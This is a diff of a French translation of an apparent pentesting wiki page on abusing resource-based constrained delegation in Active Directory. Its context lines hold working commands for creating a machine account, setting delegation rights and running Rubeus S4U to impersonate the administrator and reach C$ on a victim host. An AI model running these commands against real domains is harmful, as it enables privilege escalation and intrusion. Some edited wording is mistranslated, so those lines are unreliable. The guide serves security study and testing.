@@ -24,7 +24,7 @@ Cependant, si le **TGS** utilisé dans **S4U2Proxy** **n'est pas Transférable**
 
 Supposons que l'attaquant a déjà **des privilèges d'écriture équivalents sur l'ordinateur de la victime**.
 
-1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** (“Service A”). Notez que **tout** _Utilisateur Administrateur_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 **objets d'ordinateur (**_**MachineAccountQuota**_**)** et leur attribuer un **SPN**. Donc, l'attaquant peut simplement créer un objet d'ordinateur et définir un SPN.
+1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** (“Service A”). Notez que **tout** _Utilisateur Admin_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 **objets d'ordinateur (**_**MachineAccountQuota**_**)** et leur attribuer un **SPN**. Donc, l'attaquant peut simplement créer un objet d'ordinateur et définir un SPN.
 2. L'attaquant **abuse de son privilège d'ÉCRITURE** sur l'ordinateur de la victime (ServiceB) pour configurer **la délégation contrainte basée sur les ressources pour permettre à ServiceA d'imposer n'importe quel utilisateur** contre cet ordinateur de la victime (ServiceB).
 3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A à Service B pour un utilisateur **avec un accès privilégié à Service B**.
 1. S4U2Self (depuis le compte SPN compromis/créé) : Demander un **TGS d'Administrateur pour moi** (Non Transférable).
@@ -48,7 +48,7 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### Configuration de la R**esource-based Constrained Delegation**
+### Configuration de la R**eprésentation basée sur la délégation contrainte**
 
 **Utilisation du module PowerShell activedirectory**
 ```powershell
@@ -70,7 +70,7 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### Réalisation d'une attaque S4U complète
+### Réaliser une attaque S4U complète
 
 Tout d'abord, nous avons créé le nouvel objet Ordinateur avec le mot de passe `123456`, donc nous avons besoin du hash de ce mot de passe :
 ```bash
@@ -86,12 +86,12 @@ Vous pouvez générer plus de tickets en demandant une seule fois en utilisant l
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 > [!CAUTION]
-> Notez que les utilisateurs ont un attribut appelé "**Cannot be delegated**". Si un utilisateur a cet attribut à True, vous ne pourrez pas l'imiter. Cette propriété peut être vue dans bloodhound.
+> Notez que les utilisateurs ont un attribut appelé "**Cannot be delegated**". Si un utilisateur a cet attribut à True, vous ne pourrez pas l'impliquer. Cette propriété peut être vue dans BloodHound.
 
 ### Accès
 
 La dernière ligne de commande effectuera l'**attaque S4U complète et injectera le TGS** de l'Administrateur vers l'hôte victime en **mémoire**.\
-Dans cet exemple, un TGS pour le service **CIFS** a été demandé à l'Administrateur, vous pourrez donc accéder à **C$** :
+Dans cet exemple, un TGS a été demandé pour le service **CIFS** de l'Administrateur, vous pourrez donc accéder à **C$** :
 ```bash
 ls \\victim.domain.local\C$
 ```
